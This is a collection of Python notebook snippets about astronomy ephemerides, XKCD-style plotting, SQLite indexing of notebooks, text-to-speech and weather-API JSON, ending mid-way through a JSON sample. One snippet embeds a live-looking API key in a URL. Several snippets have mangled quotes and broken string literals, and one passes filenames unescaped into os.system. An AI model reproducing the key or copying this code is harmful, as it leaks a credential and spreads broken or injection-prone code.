    >>> d.datetime()
    datetime.datetime(2000, 12, 25, 12, 41, 15, 999999)

    In those last two commands, note that slight round-off error has converted sixteen seconds to 15.999999 seconds! The inevitability of such errors is why PyEphem exposes its own date type instead of returning Python datetime objects automatically.
Tuples

    PyEphem can return a date as a six-element tuple giving the year, month, day, hour, minute, and seconds, where the seconds include any fractions of a second. You can also provide such a tuple when creating a PyEphem date.

    >>> timetuple = (1984, 5, 30, 12, 23, 45)
    >>> print(ephem.Date(timetuple))
    1984/5/30 12:23:45

    >>> d = ephem.Date('2001/12/14 16:07:57')
    >>> print(d.tuple())
    (2001, 12, 14, 16, 7, 57.00000002514571)

    Several functions in the Python standard module time will accept the time formatted as one of these six-element tuples. This feature was used in the Time Zones section, above, to convert a PyEphem date into local time.
Triples

    There may be occasions where you need to manipulate the year and month but do not need to break the day into hours and minutes. In these cases, you can provide a three-item tuple (a “triple” of values) when creating a PyEphem date, and receive one back by calling the triple() method.

    >>> timetriple = (1998, 2, 26.691458333334594)
    >>> print(ephem.Date(timetriple))
    1998/2/26 16:35:42

    >>> d = ephem.Date('1996/4/17 22:37:11.5')
    >>> print(d.triple())
    (1996, 4, 17.94249421296263)

Floats

    Finally, since a PyEphem date is really just a floating-point number, so you can manually supply the value you want it to have.

    >>> print(ephem.Date(37238.1721875))
    2001/12/14 16:07:57

    >>> d = ephem.Date('2000/12/25 12:41:16')
    >>> print('%.6f' % d)
    36884.028657



----
id:50

import numpy as np
import matplotlib.pyplot as plt
from jplephem.spk import SPK
import time

ephem = 'de421.bsp'
ephem = 'de405.bsp'

kernel = SPK.open(ephem)

jd_1900_01_01 = 2415020.5004882407

ntimes = [i*10**n for n in range(5) for i in [1, 2, 5]]

years  = [np.zeros(1)] + [np.linspace(0, 100, n) for n in ntimes[1:]] # 100 years

barytup  = (0, 3)
earthtup = (3, 399)
# moontup  = (3, 301)

microsecs = []
for y in years:
    mics = []
    #for thing in things:

    jd = jd_1900_01_01 + y * 365.25 # roughly, it doesn't matter here

    tstart = time.clock()
    answer = kernel[earthtup].compute(jd) + kernel[barytup].compute(jd)
    mics.append(1E+06 * (time.clock() - tstart))

    microsecs.append(mics)

microsecs = np.array(microsecs)

many = [len(y) for y in years]

fig = plt.figure()
ax  = plt.subplot(111, xlabel='length of JD object',
                       ylabel='microseconds',
                       title='time for jplephem [0,3] and [3,399] with ' + ephem )

#   from here: http://stackoverflow.com/a/14971193/3904031
for item in ([ax.title, ax.xaxis.label, ax.yaxis.label] +
             ax.get_xticklabels() + ax.get_yticklabels()):
    item.set_fontsize(item.get_fontsize() + 4)

#for name, mics in zip(names, microsecs):
ax.plot(many, microsecs, lw=2, label='earth')
plt.legend(loc='upper left', shadow=False, fontsize='x-large')
plt.xscale('log')
plt.yscale('log')
plt.ylim(1E+02, 1E+06)

plt.savefig("jplephem speed test " + ephem.split('.')[0])

plt.show()



----
id:51

import numpy as np
import matplotlib.pyplot as plt
from   skyfield.api import load, JulianDate
import time

ephem = 'de421.bsp'
ephem = 'de405.bsp'

de = load(ephem)  

earth            = de['earth']
moon             = de['moon']
earth_barycenter = de['earth barycenter']
mercury          = de['mercury']
jupiter          = de['jupiter barycenter']
pluto            = de['pluto barycenter']

things = [ earth,   moon,   earth_barycenter,   mercury,   jupiter,   pluto ]
names  = ['earth', 'moon', 'earth barycenter', 'mercury', 'jupiter', 'pluto']

ntimes = [i*10**n for n in range(5) for i in [1, 2, 5]]

years  = [np.zeros(1)] + [np.linspace(0, 100, n) for n in ntimes[1:]] # 100 years

microsecs = []
for y in years:

    from skyfield.api import load
    ts = load.timescale()
    t = ts.utc(1980, 4, 20)       # the new way

    jd = ts.tt(jd=2444349.500592)  # jd is also supported for tai, tt, tdb
    
    # Depreciated
    #jd = JulianDate(utc=(1900 + y, 1, 1))
    mics = []
    for thing in things:

        tstart = time.clock()
        answer = thing.at(jd).position.km
        mics.append(1E+06 * (time.clock() - tstart))

    microsecs.append(mics)

microsecs = np.array(microsecs).T

many = [len(y) for y in years]


fig = plt.figure(figsize=(10, 8))
ax  = plt.subplot(111, xlabel='length of JD object',
                       ylabel='microseconds',
                       title='time for thing.at(jd).position.km with ' + ephem )

for item in ([ax.title, ax.xaxis.label, ax.yaxis.label] +
             ax.get_xticklabels() + ax.get_yticklabels()):
    item.set_fontsize(item.get_fontsize() + 4) # http://stackoverflow.com/a/14971193/3904031

for name, mics in zip(names, microsecs):
    ax.plot(many, mics, lw=2, label=name)
plt.legend(loc='upper left', shadow=False, fontsize='x-large')
plt.xscale('log')
plt.yscale('log')
plt.savefig("skyfield speed test " + ephem.split('.')[0])
plt.show()

----
id:52

# Some helper functions
def norm(x, x0, sigma):
    return np.exp(-0.5 * (x - x0) ** 2 / sigma ** 2)

def sigmoid(x, x0, alpha):
    return 1. / (1. + np.exp(- (x - x0) / alpha))
    
# define the curves
x = np.linspace(0, 1, 100)
y1 = np.sqrt(norm(x, 0.7, 0.05)) + 0.2 * (1.5 - sigmoid(x, 0.8, 0.05))

y2 = 0.2 * norm(x, 0.5, 0.2) + np.sqrt(norm(x, 0.6, 0.05)) + 0.1 * (1 - sigmoid(x, 0.75, 0.05))

y3 = 0.05 + 1.4 * norm(x, 0.85, 0.08)
y3[x > 0.85] = 0.05 + 1.4 * norm(x[x > 0.85], 0.85, 0.3)

# draw the curves
ax = pl.axes()
ax.plot(x, y1, c='gray')
ax.plot(x, y2, c='blue')
ax.plot(x, y3, c='red')

ax.text(0.3, -0.1, "Yard")
ax.text(0.5, -0.1, "Steps")
ax.text(0.7, -0.1, "Door")
ax.text(0.9, -0.1, "Inside")

ax.text(0.05, 1.1, "fear that
there's
something
behind me")
ax.plot([0.15, 0.2], [1.0, 0.2], '-k', lw=0.5)

ax.text(0.25, 0.8, "forward
speed")
ax.plot([0.32, 0.35], [0.75, 0.35], '-k', lw=0.5)

ax.text(0.9, 0.4, "embarrassment")
ax.plot([1.0, 0.8], [0.55, 1.05], '-k', lw=0.5)

ax.set_title("Walking back to my
front door at night:")

ax.set_xlim(0, 1)
ax.set_ylim(0, 1.5)

# modify all the axes elements in-place
XKCDify(ax, expand_axes=True)


----
id:53

np.random.seed(0)

ax = pylab.axes()

x = np.linspace(0, 10, 100)
ax.plot(x, np.sin(x) * np.exp(-0.1 * (x - 5) ** 2), 'b', lw=1, label='damped sine')
ax.plot(x, -np.cos(x) * np.exp(-0.1 * (x - 5) ** 2), 'r', lw=1, label='damped cosine')

ax.set_title('check it out!')
ax.set_xlabel('x label')
ax.set_ylabel('y label')

ax.legend(loc='lower right')

ax.set_xlim(0, 10)
ax.set_ylim(-1.0, 1.0)

#XKCDify the axes -- this operates in-place
XKCDify(ax, xaxis_loc=0.0, yaxis_loc=1.0,
        xaxis_arrow='+-', yaxis_arrow='+-',
        expand_axes=True)

----
id:54

""
XKCD plot generator
-------------------
Author: Jake Vanderplas

This is a script that will take any matplotlib line diagram, and convert it
to an XKCD-style plot.  It will work for plots with line & text elements,
including axes labels and titles (but not axes tick labels).

The idea for this comes from work by Damon McDougall
  http://www.mail-archive.com/matplotlib-users@lists.sourceforge.net/msg25499.html
""
import numpy as np
import pylab as pl
from scipy import interpolate, signal
import matplotlib.font_manager as fm


# We need a special font for the code below.  It can be downloaded this way:
import os
import urllib2
if not os.path.exists('Humor-Sans.ttf'):
    fhandle = urllib2.urlopen('http://antiyawn.com/uploads/Humor-Sans-1.0.ttf')
    open('Humor-Sans.ttf', 'wb').write(fhandle.read())

    
def xkcd_line(x, y, xlim=None, ylim=None,
              mag=1.0, f1=30, f2=0.05, f3=15):
    ""
    Mimic a hand-drawn line from (x, y) data

    Parameters
    ----------
    x, y : array_like
        arrays to be modified
    xlim, ylim : data range
        the assumed plot range for the modification.  If not specified,
        they will be guessed from the  data
    mag : float
        magnitude of distortions
    f1, f2, f3 : int, float, int
        filtering parameters.  f1 gives the size of the window, f2 gives
        the high-frequency cutoff, f3 gives the size of the filter
    
    Returns
    -------
    x, y : ndarrays
        The modified lines
    ""
    x = np.asarray(x)
    y = np.asarray(y)
    
    # get limits for rescaling
    if xlim is None:
        xlim = (x.min(), x.max())
    if ylim is None:
        ylim = (y.min(), y.max())

    if xlim[1] == xlim[0]:
        xlim = ylim
        
    if ylim[1] == ylim[0]:
        ylim = xlim

    # scale the data
    x_scaled = (x - xlim[0]) * 1. / (xlim[1] - xlim[0])
    y_scaled = (y - ylim[0]) * 1. / (ylim[1] - ylim[0])

    # compute the total distance along the path
    dx = x_scaled[1:] - x_scaled[:-1]
    dy = y_scaled[1:] - y_scaled[:-1]
    dist_tot = np.sum(np.sqrt(dx * dx + dy * dy))

    # number of interpolated points is proportional to the distance
    Nu = int(200 * dist_tot)
    u = np.arange(-1, Nu + 1) * 1. / (Nu - 1)

    # interpolate curve at sampled points
    k = min(3, len(x) - 1)
    res = interpolate.splprep([x_scaled, y_scaled], s=0, k=k)
    x_int, y_int = interpolate.splev(u, res[0]) 

    # we'll perturb perpendicular to the drawn line
    dx = x_int[2:] - x_int[:-2]
    dy = y_int[2:] - y_int[:-2]
    dist = np.sqrt(dx * dx + dy * dy)

    # create a filtered perturbation
    coeffs = mag * np.random.normal(0, 0.01, len(x_int) - 2)
    b = signal.firwin(f1, f2 * dist_tot, window=('kaiser', f3))
    response = signal.lfilter(b, 1, coeffs)

    x_int[1:-1] += response * dy / dist
    y_int[1:-1] += response * dx / dist

    # un-scale data
    x_int = x_int[1:-1] * (xlim[1] - xlim[0]) + xlim[0]
    y_int = y_int[1:-1] * (ylim[1] - ylim[0]) + ylim[0]
    
    return x_int, y_int


def XKCDify(ax, mag=1.0,
            f1=50, f2=0.01, f3=15,
            bgcolor='w',
            xaxis_loc=None,
            yaxis_loc=None,
            xaxis_arrow='+',
            yaxis_arrow='+',
            ax_extend=0.1,
            expand_axes=False):
    ""Make axis look hand-drawn

    This adjusts all lines, text, legends, and axes in the figure to look
    like xkcd plots.  Other plot elements are not modified.
    
    Parameters
    ----------
    ax : Axes instance
        the axes to be modified.
    mag : float
        the magnitude of the distortion
    f1, f2, f3 : int, float, int
        filtering parameters.  f1 gives the size of the window, f2 gives
        the high-frequency cutoff, f3 gives the size of the filter
    xaxis_loc, yaxis_log : float
        The locations to draw the x and y axes.  If not specified, they
        will be drawn from the bottom left of the plot
    xaxis_arrow, yaxis_arrow : str
        where to draw arrows on the x/y axes.  Options are '+', '-', '+-', or ''
    ax_extend : float
        How far (fractionally) to extend the drawn axes beyond the original
        axes limits
    expand_axes : bool
        if True, then expand axes to fill the figure (useful if there is only
        a single axes in the figure)
    ""
    # Get axes aspect
    ext = ax.get_window_extent().extents
    aspect = (ext[3] - ext[1]) / (ext[2] - ext[0])

    xlim = ax.get_xlim()
    ylim = ax.get_ylim()

    xspan = xlim[1] - xlim[0]
    yspan = ylim[1] - xlim[0]

    xax_lim = (xlim[0] - ax_extend * xspan,
               xlim[1] + ax_extend * xspan)
    yax_lim = (ylim[0] - ax_extend * yspan,
               ylim[1] + ax_extend * yspan)

    if xaxis_loc is None:
        xaxis_loc = ylim[0]

    if yaxis_loc is None:
        yaxis_loc = xlim[0]

    # Draw axes
    xaxis = pl.Line2D([xax_lim[0], xax_lim[1]], [xaxis_loc, xaxis_loc],
                      linestyle='-', color='k')
    yaxis = pl.Line2D([yaxis_loc, yaxis_loc], [yax_lim[0], yax_lim[1]],
                      linestyle='-', color='k')

    # Label axes3, 0.5, 'hello', fontsize=14)
    ax.text(xax_lim[1], xaxis_loc - 0.02 * yspan, ax.get_xlabel(),
            fontsize=14, ha='right', va='top', rotation=12)
    ax.text(yaxis_loc - 0.02 * xspan, yax_lim[1], ax.get_ylabel(),
            fontsize=14, ha='right', va='top', rotation=78)
    ax.set_xlabel('')
    ax.set_ylabel('')

    # Add title
    ax.text(0.5 * (xax_lim[1] + xax_lim[0]), yax_lim[1],
            ax.get_title(),
            ha='center', va='bottom', fontsize=16)
    ax.set_title('')

    Nlines = len(ax.lines)
    lines = [xaxis, yaxis] + [ax.lines.pop(0) for i in range(Nlines)]

    for line in lines:
        x, y = line.get_data()

        x_int, y_int = xkcd_line(x, y, xlim, ylim,
                                 mag, f1, f2, f3)

        # create foreground and background line
        lw = line.get_linewidth()
        line.set_linewidth(2 * lw)
        line.set_data(x_int, y_int)

        # don't add background line for axes
        if (line is not xaxis) and (line is not yaxis):
            line_bg = pl.Line2D(x_int, y_int, color=bgcolor,
                                linewidth=8 * lw)

            ax.add_line(line_bg)
        ax.add_line(line)

    # Draw arrow-heads at the end of axes lines
    arr1 = 0.03 * np.array([-1, 0, -1])
    arr2 = 0.02 * np.array([-1, 0, 1])

    arr1[::2] += np.random.normal(0, 0.005, 2)
    arr2[::2] += np.random.normal(0, 0.005, 2)

    x, y = xaxis.get_data()
    if '+' in str(xaxis_arrow):
        ax.plot(x[-1] + arr1 * xspan * aspect,
                y[-1] + arr2 * yspan,
                color='k', lw=2)
    if '-' in str(xaxis_arrow):
        ax.plot(x[0] - arr1 * xspan * aspect,
                y[0] - arr2 * yspan,
                color='k', lw=2)

    x, y = yaxis.get_data()
    if '+' in str(yaxis_arrow):
        ax.plot(x[-1] + arr2 * xspan * aspect,
                y[-1] + arr1 * yspan,
                color='k', lw=2)
    if '-' in str(yaxis_arrow):
        ax.plot(x[0] - arr2 * xspan * aspect,
                y[0] - arr1 * yspan,
                color='k', lw=2)

    # Change all the fonts to humor-sans.
    prop = fm.FontProperties(fname='Humor-Sans.ttf', size=16)
    for text in ax.texts:
        text.set_fontproperties(prop)
    
    # modify legend
    leg = ax.get_legend()
    if leg is not None:
        leg.set_frame_on(False)
        
        for child in leg.get_children():
            if isinstance(child, pl.Line2D):
                x, y = child.get_data()
                child.set_data(xkcd_line(x, y, mag=10, f1=100, f2=0.001))
                child.set_linewidth(2 * child.get_linewidth())
            if isinstance(child, pl.Text):
                child.set_fontproperties(prop)
    
    # Set the axis limits
    ax.set_xlim(xax_lim[0] - 0.1 * xspan,
                xax_lim[1] + 0.1 * xspan)
    ax.set_ylim(yax_lim[0] - 0.1 * yspan,
                yax_lim[1] + 0.1 * yspan)

    # adjust the axes
    ax.set_xticks([])
    ax.set_yticks([])      

    if expand_axes:
        ax.figure.set_facecolor(bgcolor)
        ax.set_axis_off()
        ax.set_position([0, 0, 1, 1])
    
    return ax


----
id:55

%%writefile SatInfo.py
from itertools import izip, islice
from time import sleep
def satinfo():
    search_string = raw_input("Load : ")
    with open('visual.txt', 'r') as infile, open('visual.tmp', 'w') as outfile:
        for line in infile:
            if search_string in line:
                outfile.writelines([line, next(infile), next(infile)])

    from time import sleep
    with open('visual.tmp', 'r') as f:
        while True:
                name = f.readline()
                one = f.readline()
                two = f.readline()
                sleep(1)
                return name, one, two    
                         
def prntlist():            
    from time import sleep
    with open('visual.txt', 'r') as f:
        while True:
            next_n_lines = list(islice(f, 3))
            if not next_n_lines:
                break
            sleep(.5)
            print next_n_lines[0],
        
def reuse():
    from time import sleep
    with open('visual.tmp', 'r') as f:
        while True:
                name = f.readline()
                one = f.readline()
                two = f.readline()
                sleep(1)
                #print name, one, two    
                f.close()
                return name, one, two  
            
            

----
id:56

Join All Files Starting With Wiki_
import glob
import os
for f in glob.glob("Wiki_*.txt"):
    os.system("cat "+f+" >> ALL_WIKI.txt")
-----------
Count All Words in a File
fname = raw_input("Enter file name: ")
num_words = 0
with open(fname, 'r') as f:
    for line in f:
        words = line.split()
        num_words += len(words)
print "Number of words: ",num_words

------------
Remove All Blank Lines
from Txmanip import RemoveBlank
origFile = "ALL_WIKI.txt"
saveAS = "ALL_WIKI_GOOD.txt"
RemoveBlank.removeblank(origFile, saveAS)
------------

----
id:57

# %load SearchFilename.py
'''
Search a filename for a phrase and how many following lines to display
USAGE:
import SearchFilename
filename = "hek.txt"
length = 4
SearchFilename.searchfilename(filename, length)
'''
def searchfilename(filename, length):
    f = open(filename, "r")
    searchlines = f.readlines()
    f.close()
    search = str(raw_input("Search Phrase : "))
    for i, line in enumerate(searchlines):
        if search in line: 
            for l in searchlines[i:i+length]: print l,
            print
            
#USAGE:
import SearchFilename
filename = "ALL_WIKI_GOOD.txt"
# length = how many lines after
length = 7
SearchFilename.searchfilename(filename, length) 

----
id:58

import json
import sys
from time import sleep
import sqlite3
import csv
title = "ftp2.ipynb"
f= open(title,"w")
f.close()

conn = sqlite3.connect('ftp.db')
conn.text_factory=str 
c = conn.cursor()
with open(title, 'a') as outfile:
    for row in c.execute('SELECT text, title FROM ipynb'):
        row0 = row[1]
        #row0.write(outfile)
        #outfile = csv.writer(row0)
        outfile.write(row0)
conn.close()
f.close()

jupyter to database from database to jupyter notebook
            

----
id:59

import json
import sys
from time import sleep
import sqlite3
conn = sqlite3.connect('ftp.db')
conn.text_factory=str 
c = conn.cursor()
for row in c.execute('SELECT text, title  FROM ipynb'):
    sleep(.5)
    #row0 = base64.b64decode(row[0])
    #print row0, row[1]
    print row[1]  
    
jupyter to view database from database to jupyter notebook
            

----
id:60

import base64
from time import sleep
title = "FTP_and_Editor.ipynb"
import sqlite3
conn = sqlite3.connect('ftp.db')
conn.text_factory=str 
c = conn.cursor()
with open(title, 'r') as f:
    lines = f.readlines()
    for line in lines:
        encodedlistvalue=base64.b64encode(line)
        c.execute("INSERT INTO ipynb VALUES (?,?)", (encodedlistvalue, line)) 
        conn.commit()
        #print encodedlistvalue

conn.close()
f.close()
    
jupyter to view database from database to jupyter notebook
            

----
id:61

import sqlite3
conn = sqlite3.connect('ftp.db')
c = conn.cursor()
conn.text_factory=str 
c.execute(""
CREATE TABLE ipynb (text, title);
"")
conn.commit()
conn.close()
    
jupyter to view database from database to jupyter notebook
            

----
id:62

import sqlite3
import sys
conn = sqlite3.connect('notebooks.db')
conn.text_factory = str
c = conn.cursor()
count=0;req=200
id1 = raw_input("Starting ID : ")
id2 = raw_input("How Many Rows : ")
# id1 is start id2 is how many lines
for row in c.execute('SELECT rowid, * from ipynb LIMIT ? OFFSET ?',  (id2, id1)):
    count=count+1
    #print row[0],row[1],"
",row[2]
    print row[2]
    if count > req:
        conn.close()
        sys.exit()

----
id:63

import base64
from time import sleep
import sqlite3
conn = sqlite3.connect('notebooks.db')
conn.text_factory=str 
c = conn.cursor()
line =" "
title = "index"
c.execute("INSERT INTO ipynb VALUES (?,?)", (title, line)) 
conn.commit()
        #print encodedlistvalue

conn.close()
f.close()

----
id:64

import json
import sys
from time import sleep
import sqlite3
import csv
conn = sqlite3.connect('notebooks.db')
conn.text_factory=str 
c = conn.cursor()
#c.execute("DELETE title, line FROM ipynb where rowid MATCH '362113' "):
#c.execute("delete from ipynb where rowid=362113;"):
c.execute("DELETE FROM ipynb WHERE rowid = ?", (362113,))
conn.commit()
conn.close()
        

----
id:65

import sqlite3
connection = sqlite3.connect('notebooks.db')
connection.row_factory = sqlite3.Row
cursor = connection.execute('select * from ipynb')
# instead of cursor.description:
row = cursor.fetchone()
names = row.keys()
print names

----
id:66

# clustering dataset
from sklearn.cluster import KMeans
from sklearn import metrics
import numpy as np
import matplotlib.pyplot as plt
 
x1 = np.random.randint(0,20, size=50)
x2 = np.random.randint(0,20, size=50)
# create new plot and data
plt.plot()
X = np.array(list(zip(x1, x2))).reshape(len(x1), 2)
colors = ['b', 'g', 'c']
markers = ['o', 'v', 's']
 
# KMeans algorithm 
K = 3
kmeans_model = KMeans(n_clusters=K).fit(X)
 
print(kmeans_model.cluster_centers_)
centers = np.array(kmeans_model.cluster_centers_)
 
plt.plot()
plt.title('k means centroids')
 
for i, l in enumerate(kmeans_model.labels_):
    plt.plot(x1[i], x2[i], color=colors[l], marker=markers[l],ls='None')
    plt.xlim([-1, 21])
    plt.ylim([-1, 21])

plt.scatter(centers[:,0], centers[:,1], marker="X", color='r')
plt.show()

----
id:67

# clustering dataset
from sklearn.cluster import KMeans
from sklearn import metrics
import numpy as np
import matplotlib.pyplot as plt
 
x1 = np.random.randint(1,9, size=30)
x2 = np.random.randint(1,9, size=30)
 
plt.plot()
plt.xlim([0, 10])
plt.ylim([0, 10])
plt.title('Dataset')
plt.scatter(x1, x2)
plt.show()
 
# create new plot and data
plt.plot()
X = np.array(list(zip(x1, x2))).reshape(len(x1), 2)
colors = ['b', 'g', 'r']
markers = ['o', 'v', 's']
 
# KMeans algorithm 
K = 3
kmeans_model = KMeans(n_clusters=K).fit(X)
 
plt.plot()
for i, l in enumerate(kmeans_model.labels_):
    plt.plot(x1[i], x2[i], color=colors[l], marker=markers[l],ls='None')
    plt.xlim([0, 10])
    plt.ylim([0, 10])

plt.show()


----
id:68

from gtts import gTTS
import os
tts = gTTS(text='Good morning. Good morning', lang='en')
tts.save("good.mp3")
os.system("mpg321 good.mp3")

----
id:69

import os
import re
from pygame import mixer
import datetime
import time
from gtts import gTTS

mp3_nameold='111'
mp3_name = "1.mp3"

mixer.init()


f = open("test001.txt","r")
ss = f.readline()
while ss:
   
    split_regex = re.compile(r'[.|!|?|…]')
    sentences = filter(lambda t: t, [t.strip() for t in split_regex.split(ss)])

    for x in sentences:
        if(x!=""):
            print(x)
            tts=gTTS(text=x, lang='en')
            tts.save(mp3_name)
            mixer.music.load(mp3_name)
            mixer.music.play()
            while mixer.music.get_busy():
                time.sleep(0.1)
            mp3_nameold=mp3_name
            now_time = datetime.datetime.now()
            mp3_name = now_time.strftime("%d%m%Y%I%M%S")+".mp3"
    ss = f.readline()
f.close
mixer.music.load('1.mp3')
mixer.stop
mixer.quit

if(os.path.exists(mp3_nameold)):
    os.remove(mp3_nameold)


----
id:70

# USAGE example:
# import UnCamel
# x = "TimeToUncamelCaseTextUsingFunctions"
# UnCamel.uncamel(x)
def uncamel(x): 
    return reduce(lambda a,b: a + ((b.upper() == b and (len(a) and a[-1].upper() != a[-1])) 
                                   and (' ' + b) or b), x, '')
def uncam(x):
    import re
    return re.sub("([a-z])([A-Z])","\g<1> \g<2>",x)
 -------
def uncamel(x): 
    return reduce(lambda a,b: a + ((b.upper() == b and 
                                    (len(a) and a[-1].upper() != a[-1])) and 
                                   (' ' + b) or b), x, '')
x = "LetUsTryToUncamelCaseTextUsingFunctions"
uncamel(x) 

----
id:71

import os
import os.path
title = "ipynb.list"
f= open(title,"w")
f.close()
count=0
for dirpath, dirnames, filenames in os.walk("/home/jack/"):
    for filename in [f for f in filenames if f.endswith(".ipynb")]:
        count=count+1
        Path = os.path.join(dirpath, filename)
        with open(title, 'a') as outfile:
            path = Path+"
"
            outfile.write(path)
        

----
id:72

titlelist = "ipynb.list"
titles = open(titlelist,"r")
for title in titles.readlines():
    filename = os.path.basename(title)
    description = filename
    description = description.replace("-", " ")
    description = description.replace("_", " ")
    description = description.replace(".ipynb", " ")
    description = re.sub("([a-z])([A-Z])","\g<1> \g<2>",description)
    title = title.replace("
", "")
    print title, description
        

----
id:73

bad_words = ['.ipynb_checkpoints', 'checkpoint', '/.ipynb']
with open('ipynb.list') as oldfile, open('ipynb-clean.list', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(line)
        

----
id:74

import sqlite3
import re
import sys
import time
database = "test.db"
#database = "junk2.db"
conn = sqlite3.connect(database)
conn.text_factory = lambda x: unicode(x, "utf-8", "ignore")
c = conn.cursor()
c.execute(""
CREATE VIRTUAL TABLE IF NOT EXISTS ipynb 
USING FTS4(file, content, description);
"")
conn.commit()
conn.close()
conn = sqlite3.connect(database)
c = conn.cursor()
count=1
titlelist = "ipynb-clean.list"
titles = open(titlelist,"r")
for title in titles.readlines():
    filename = os.path.basename(title)
    # Use for debug print filename,":"
    description = filename
    description = description.replace("-", " ")
    description = description.replace("_", " ")
    description = description.replace(".ipynb", " ")
    description = re.sub("([a-z])([A-Z])","\g<1> \g<2>",description)
    title = title.replace("
", "")
    
    dt=time.ctime(os.path.getctime(title))
    dt=str(dt)
    #dt = dt.replace(" ","")
    description = description+"Date :"+dt
    suf = title.replace("/home/jack/","")
    suf = suf.replace(".ipynb","_")
    suf = suf.replace("/","_")
    filename = suf+filename
    with open(title, "rb") as input_file:
                ablob = input_file.read()
                content  = sqlite3.Binary(ablob)
                c.execute("INSERT INTO ipynb (file, content, description) VALUES(?, ?, ?)", 
                      (filename, content, description))
                
                conn.commit()
    line = file
    #line ="Good-mouse-sizing-and-cropping.ipynb"
    index = "Index"
    c.execute("INSERT INTO ipynb VALUES (?,?,?)", (index, filename, description)) 
    conn.commit()
    count=count+1
    print count,filename, description

c.close()
conn.close() 
        

----
id:75

import sqlite3
#database = "FTS4_IPYNB_indexed.db"
database = "test.db"
#database = "/home/jack/Desktop/text_stuff/notebooks.db"
conn = sqlite3.connect(database)
conn.text_factory=str
c = conn.cursor()
c.execute("SELECT COUNT(*) from ipynb")
(number_of_rows,)=c.fetchone()
print (number_of_rows,) 
        

----
id:76

import json
import sys
from time import sleep
import sqlite3
import csv
database = "test.db"
conn = sqlite3.connect(database)
conn.text_factory=str 
c = conn.cursor()
ROWID = 
c.execute("DELETE FROM ipynb WHERE rowid = ?", (ROWID,))
conn.commit()
conn.close()
        
        

----
id:77

import sqlite3
#database = "FTS4_IPYNB.db"
database = "FTS4_IPYNB_indexed.db"
conn = sqlite3.connect(database)
c = conn.cursor()
conn.text_factory=str 
c.execute(""
CREATE VIRTUAL TABLE IF NOT EXISTS ipynb 
USING FTS4(file, content, description);
"")
conn.commit()
conn.close()
conn = sqlite3.connect(database)
c = conn.cursor()
count=0
while count<19:
    count=count+1
    if count==1:PATH = "/home/jack/Desktop/deep-dream-generator/notebooks/"
    if count==2:PATH = "/home/jack/Desktop/text_stuff/"
    if count==3:PATH = "/home/jack/Desktop/imagebot/"
    if count==4:PATH = "/home/jack/Desktop/Snippet_Warehouse/"
    if count==5:PATH = "/home/jack/Desktop/gitjupyter/"
    if count==6:PATH = "/home/jack/Desktop/jack_watch/"
    if count==7:PATH = "/home/jack/Desktop/jack_watch/nltk/"
    if count==8:PATH = "/home/jack/Desktop/jack_watch/Python-Lectures/"
    if count==9:PATH = "/home/jack/Desktop/jack_watch/jupyter_examples-master/"
    if count==10:PATH = "/home/jack/Desktop/Books/numerical-python-book-code/"
    if count==11:PATH = "/home/jack/Desktop/Books/pydata-book/"
    if count==12:PATH = "/home/jack/Desktop/Ruby/"
    if count==13:PATH = "/home/jack/Desktop/alice/ChatterBot/"
    if count==14:PATH = "/home/jack/Desktop/deep-dream-generator/LOCAL-notebooks/"
    if count==15:PATH = "/home/jack/Desktop/numpy-array-filters/"
    if count==16:PATH = "/home/jack/Desktop/pycode/"
    if count==17:PATH = "/home/jack/Desktop/pycode/vpython2/TrigonometryBot/"
    if count==18:PATH = "/home/jack/Desktop/temp/args_csv_Twython_ImageBot/"
    if count==19:PATH = "/home/jack/python3-starter/notebooks/"
    for file in os.listdir(PATH):
        if file.endswith(".ipynb"):
            filename = PATH+file
            filein = PATH
            filein = filein.replace("/home/jack/", "")
            filein = filein.replace("/", "_")
            filein = filein+file
            description = filein
            description = description.replace("_", " ")
            description = description.replace("-", " ")
            description = description.replace("/", " ")
            description = description+"
"+PATH+file+"
"+file
            with open(filename, "rb") as input_file:
                    ablob = input_file.read()
                    content  = sqlite3.Binary(ablob)
                    c.execute("INSERT INTO ipynb (file, content, description) VALUES(?, ?, ?)", 
                              (filein, content, description))
                    print os.path.join(PATH, file, filein)
                    conn.commit()
            line = file
            #line ="Good-mouse-sizing-and-cropping.ipynb"
            title = "index"
            c.execute("INSERT INTO ipynb VALUES (?,?,?)", (title, file, description)) 
            conn.commit()

c.close()
conn.close() 
        
        

----
id:78

from urllib2 import Request, urlopen
import json
URL = 'http://api.apixu.com/v1/forecast.json?key=a5e6cd9fdf4a4b4fabe55704170811&q=Manila&days=7'
request=Request(URL)
response = urlopen(request)
forecast = response.read()
print forecast

----
id:79

data =[{'state': 'Florida',
          'shortname': 'FL',
          'info': {
               'governor': 'Rick Scott'
          },
          'counties': [{'name': 'Dade', 'population': 12345},
                      {'name': 'Broward', 'population': 40000},
                      {'name': 'Palm Beach', 'population': 60000}]},
          {'state': 'Ohio',         
          'shortname': 'OH',
          'info': {
               'governor': 'John Kasich'
          },
          'counties': [{'name': 'Summit', 'population': 1234},
                       {'name': 'Cuyahoga', 'population': 1337}]}]

from pandas.io.json import json_normalize
result = json_normalize(data, 'counties', ['state', 'shortname', ['info', 'governor']])
result

----
id:80

%%writefile weather.json
{"location":{"name":"Paris","region":"Ile-de-France","country":"France","lat":48.87,"lon":2.33,"tz_id":"Europe/Paris","localtime_epoch":1510121183,"localtime":"2017-11-08 7:06"},"current":{"last_updated_epoch":1510120819,"last_updated":"2017-11-08 07:00","temp_c":2.0,"temp_f":35.6,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":1.3,"wind_kph":2.2,"wind_degree":220,"wind_dir":"SW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":87,"cloud":75,"feelslike_c":2.0,"feelslike_f":35.6,"vis_km":10.0,"vis_miles":6.0},"forecast":{"forecastday":[{"date":"2017-11-08","date_epoch":1510099200,"day":{"maxtemp_c":9.7,"maxtemp_f":49.5,"mintemp_c":7.7,"mintemp_f":45.9,"avgtemp_c":7.3,"avgtemp_f":45.1,"maxwind_mph":3.8,"maxwind_kph":6.1,"totalprecip_mm":0.0,"totalprecip_in":0.0,"avgvis_km":18.8,"avgvis_miles":11.0,"avghumidity":59.0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"uv":0.9},"astro":{"sunrise":"07:49 AM","sunset":"05:20 PM","moonrise":"09:31 PM","moonset":"12:19 PM"},"hour":[{"time_epoch":1510095600,"time":"2017-11-08 